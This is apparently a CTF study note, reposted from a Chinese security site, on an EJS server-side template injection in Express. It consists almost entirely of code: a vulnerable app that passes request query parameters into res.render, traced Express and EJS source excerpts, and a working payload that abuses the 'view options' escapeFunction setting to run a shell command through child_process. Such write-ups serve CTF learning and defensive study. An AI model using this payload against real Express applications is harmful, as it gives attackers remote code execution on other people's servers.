# CTF 中的 EJS 漏洞筆記

> 原文: https://www.ctfiot.com/120877.html
> ID: 120877


```
const express = require('express')
const app = express()
const port = 3000

app.set('view engine', 'ejs');

app.get('/', (req,res) => {
 res.render('index', req.query);
})

app.listen(port, () => {
 console.log(`Example app listening on port ${port}`)
})
```



```
res.render = function render(view, options, callback) {
 var app = this.req.app;
 var done = callback;
 var opts = options || {};
 var req = this.req;
 var self = this;

 // support callback function as second arg
 if (typeof options === 'function') {
 done = options;
 opts = {};
 }

 // merge res.locals
 opts._locals = self.locals;

 // default callback to respond
 done = done || function (err, str) {
 if (err) return req.next(err);
 self.send(str);
 };

 // render
 app.render(view, opts, done);
};
```



```
app.render = function render(name, options, callback) {
 var cache = this.cache;
 var done = callback;
 var engines = this.engines;
 var opts = options;
 var renderOptions = {};
 var view;

 // support callback function as second arg
 if (typeof options === 'function') {
 done = options;
 opts = {};
 }

 // merge app.locals
 merge(renderOptions, this.locals);

 // merge options._locals
 if (opts._locals) {
 merge(renderOptions, opts._locals);
 }

 // merge options
 merge(renderOptions, opts);

 // set .cache unless explicitly provided
 if (renderOptions.cache == null) {
 renderOptions.cache = this.enabled('view cache');
 }

 // primed cache
 if (renderOptions.cache) {
 view = cache[name];
 }

 // view
 if (!view) {
 var View = this.get('view');

 view = new View(name, {
 defaultEngine: this.get('view engine'),
 root: this.get('views'),
 engines: engines
 });

 if (!view.path) {
 var dirs = Array.isArray(view.root) && view.root.length > 1
 ? 'directories "' + view.root.slice(0, -1).join('", "') + '" or "' + view.root[view.root.length - 1] + '"'
 : 'directory "' + view.root + '"'
 var err = new Error('Failed to lookup view "' + name + '" in views ' + dirs);
 err.view = view;
 return done(err);
 }

 // prime the cache
 if (renderOptions.cache) {
 cache[name] = view;
 }
 }

 // render
 tryRender(view, renderOptions, done);
};
```



```
function tryRender(view, options, callback) {
 try {
 view.render(options, callback);
 } catch (err) {
 callback(err);
 }
}
```



```
/**
 * Express.js support.
 *
 * This is an alias for {@link module:ejs.renderFile}, in order to support
 * Express.js out-of-the-box.
 *
 * @func
 */

exports.__express = exports.renderFile;
```



```
exports.renderFile = function () {
 var args = Array.prototype.slice.call(arguments);
 var filename = args.shift();
 var cb;
 var opts = {filename: filename};
 var data;
 var viewOpts;

 // Do we have a callback?
 if (typeof arguments[arguments.length - 1] == 'function') {
 cb = args.pop();
 }
 // Do we have data/opts?
 if (args.length) {
 // Should always have data obj
 data = args.shift();
 // Normal passed opts (data obj + opts obj)
 if (args.length) {
 // Use shallowCopy so we don't pollute passed in opts obj with new vals
 utils.shallowCopy(opts, args.pop());
 }
 // Special casing for Express (settings + opts-in-data)
 else {
 // Express 3 and 4
 if (data.settings) {
 // Pull a few things from known locations
 if (data.settings.views) {
 opts.views = data.settings.views;
 }
 if (data.settings['view cache']) {
 opts.cache = true;
 }
 // Undocumented after Express 2, but still usable, esp. for
 // items that are unsafe to be passed along with data, like `root`
 viewOpts = data.settings['view options'];
 if (viewOpts) {
 utils.shallowCopy(opts, viewOpts);
 }
 }
 // Express 2 and lower, values set in app.locals, or people who just
 // want to pass options in their data. NOTE: These values will override
 // anything previously set in settings or settings['view options']
 utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
 }
 opts.filename = filename;
 }
 else {
 data = utils.createNullProtoObjWherePossible();
 }

 return tryHandleCache(opts, data, cb);
};
```



```
if (data.settings) {
 // Pull a few things from known locations
 if (data.settings.views) {
 opts.views = data.settings.views;
 }
 if (data.settings['view cache']) {
 opts.cache = true;
 }
 // Undocumented after Express 2, but still usable, esp. for
 // items that are unsafe to be passed along with data, like `root`
 viewOpts = data.settings['view options'];
 if (viewOpts) {
 utils.shallowCopy(opts, viewOpts);
 }
}
```



```
function handleCache(options, template) {
 var func;
 var filename = options.filename;
 var hasTemplate = arguments.length > 1;

 if (options.cache) {
 if (!filename) {
 throw new Error('cache option requires a filename');
 }
 func = exports.cache.get(filename);
 if (func) {
 return func;
 }
 if (!hasTemplate) {
 template = fileLoader(filename).toString().replace(_BOM, '');
 }
 }
 else if (!hasTemplate) {
 // istanbul ignore if: should not happen at all
 if (!filename) {
 throw new Error('Internal EJS error: no file name or template '
 + 'provided');
 }
 template = fileLoader(filename).toString().replace(_BOM, '');
 }
 func = exports.compile(template, options);
 if (options.cache) {
 exports.cache.set(filename, func);
 }
 return func;
}
```



```
if (opts.client) {
 src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
 if (opts.compileDebug) {
 src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
 }
}
```



```
const payload = {
 settings: {
 'view options': {
 client: true,
 escapeFunction: '(() => {});return process.mainModule.require("child_process").execSync("id").toString()'
 }
 }
}
```



```
if (env === 'production') {
 this.enable('view cache');
}
```



```
// set .cache unless explicitly provided
if (renderOptions.cache == null) {
 renderOptions.cache = this.enabled('view cache');
}
```



```
utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
```



```
if (renderOptions.cache == null) {
 renderOptions.cache = this.enabled('view cache');
}
```
